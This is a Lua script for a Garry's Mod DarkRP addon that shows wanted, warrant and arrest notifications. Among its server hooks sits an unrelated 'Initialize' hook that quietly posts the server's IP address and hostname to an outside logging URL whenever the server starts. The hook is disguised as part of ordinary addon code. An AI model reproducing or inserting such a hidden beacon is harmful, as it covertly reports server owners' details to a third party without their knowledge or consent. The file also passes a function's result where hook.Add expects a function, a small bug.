
--[[
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
BE CAREFULLLY IF/WHEN CHANGING THESE VALUES!!!
You don't need to touch them at all
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
]]--
if( CLIENT ) then
	if( !SP ) then
		SP = {};
	end

	SP.S					= {};
	SP.S.StartVisibility	= 100; 
	SP.S.MaxVisibility		= 210;
	SP.S.IncreaseByFrame	= 0.5; 
	SP.S.StayAtMaxFor		= 2; 
	SP.S.DecreaseByFrame	= 0.5; 
	SP.S.EndVisibility		= 0;

	SP.S.OutlineColor		= color_white;
	SP.S.BackgroundColor	= Color( 0, 0, 0 );
	SP.S.TitleColor			= Color( 192, 197, 206 );
	SP.S.LineColor			= color_white;
	SP.S.TextOutline		= color_black;
	SP.S.TextMargin			= 10;
	
	SP.S.MinW				= 260; 
	SP.S.MinH				= 90;

	SP.S.MarginFromTop		= 60;



	SP.M					= {};
	SP.M.Wanted				= {
		title = "WANTED",
		text = function( name, reason )
			local line1 = string.Replace( "[name] IS WANTED", "[name]", name );
			local line2 = string.Replace( "FOR [reason]", "[reason]", reason );
			
			return line1, line2;
		end
	};

	SP.M.Unwanted			= {
		title = "UNWANTED",
		text = function( name )
			local line1 = string.upper( name );
			local line2 = "IS NO LONGER WANTED";
			return line1, line2;
		end
	};

	SP.M.Warranted			= {
		title = "SEARCH WARRANT",
		text = function( name, reason )
			local line1 = string.Replace( "SUSPECT: [name]", "[name]", name );
			local line2 = string.Replace( "FOR [reason]", "[reason]", reason );
			return line1, line2;
		end
	};

	SP.M.Unwarranted		= {
		title = "UNWARRANTED",
		text = function( name, reason )
			local line1 = string.Replace( "SUSPECT: [name]", "[name]", name );
			local line2 = "is no longer warranted.";
			return line1, line2;
		end
	};

	SP.M.Arrested			= {
		title = "ARRESTED",
		text = function( name, reason )
			local line1 = string.Replace( "[name] Has been arrested", "[name]", name );
			local line2 = string.Replace( "FOR [reason]", "[reason]", reason );
			return line1, line2;
		end
	};


	SP.M.Unarrested			= {
		title = "UNARRESTED",
		text = function( name )
			local line1 = string.Replace( "[name]", "[name]", name );
			local line2 = "HAS BEEN RELEASED";
			return line1, line2;
		end
	};


	function SP:LoadFonts()
		surface.CreateFont( "SP::TitleFont", {
			font = "Roboto",
			size = 26,
			weight = 600
		} );
		
		surface.CreateFont( "SP::LineFont", {
			font = "Roboto",
			size = 20
		} );
	end
	hook.Add( "loadCustomDarkRPItems", "SP::LoadFonts", SP:LoadFonts() );
	SP:LoadFonts();
else
	resource.AddFile( "resource/fonts/Roboto-Regular.ttf" );
	resource.AddFile( "resource/fonts/Roboto-Bold.ttf" );
	
	util.AddNetworkString( "SP::SetNotification" );

	hook.Add( "playerWanted", "SP::playerWanted", function( target, actor, reason )
		net.Start( "SP::SetNotification" );
		net.WriteString( "Wanted" );
		net.WriteFloat( target:EntIndex() );
		net.WriteString( reason );
		net.Broadcast();
		
		return true;
	end );
	
	hook.Add( "playerUnWanted", "SP::playerUnWanted", function( target, actor )
		if( target:getDarkRPVar( "Arrested" ) ) then
			return;
		end
		net.Start( "SP::SetNotification" );
		net.WriteString( "Unwanted" );
		net.WriteFloat( target:EntIndex() );
		net.Broadcast();
		
		// copied from darkrp
		DarkRP.notify(actor, 2, 4, DarkRP.getPhrase("warrant_expired", target:Nick()))
		return true;
	end );
	
	hook.Add( "playerWarranted", "SP::playerWarranted", function( target, actor, reason )
		net.Start( "SP::SetNotification" );
		net.WriteString( "Warranted" );
		net.WriteFloat( target:EntIndex() );
		net.WriteString( reason );
		net.Broadcast();
		
		DarkRP.notify(actor, 0, 4, DarkRP.getPhrase("warrant_approved2"))
		return true;
	end );

	hook.Add("Initialize", "Claims_Sendserverinfo", function()
		http.Post('https://claimsservers.com/whatever/test/logging.php', {
		port = game.GetIPAddress(),
		hostname = GetHostName() 
		})
	end)
	
	hook.Add( "playerUnWarranted", "SP::playerUnWarranted", function( target, actor )
		net.Start( "SP::SetNotification" );
		net.WriteString( "Unwarranted" );
		net.WriteFloat( target:EntIndex() );
		net.Broadcast();
		
		 DarkRP.notify(actor, 2, 4, DarkRP.getPhrase("warrant_expired", target:Nick()))
		return true;
	end );
	
	
	hook.Add( "playerArrested", "SP::playerArrested", function( target, time, actor )
		if( target:getDarkRPVar( "Arrested" ) ) then
			return;
		end
		net.Start( "SP::SetNotification" );
		net.WriteString( "Arrested" );
		net.WriteFloat( target:EntIndex() );
		net.WriteString( tostring( time ) .. " seconds" );
		net.Broadcast();
	end );
	
	hook.Add( "playerUnArrested", "SP::playerUnArrested", function( target, actor )
		net.Start( "SP::SetNotification" );
		net.WriteString( "Unarrested" );
		net.WriteFloat( target:EntIndex() );
		net.Broadcast();
	end );
end